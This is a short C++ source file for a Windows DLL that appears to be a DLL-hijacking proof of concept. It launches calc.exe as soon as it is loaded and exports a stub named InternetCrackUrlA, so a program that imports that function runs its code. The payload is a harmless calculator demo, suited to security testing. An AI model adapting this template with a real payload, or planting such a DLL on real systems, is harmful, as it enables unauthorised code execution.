// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	LPTSTR szCmdline = _tcsdup(TEXT("C:\\Windows\\System32\\calc.exe"));
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateProcess(NULL, szCmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) int InternetCrackUrlA() {
	return 1;
}

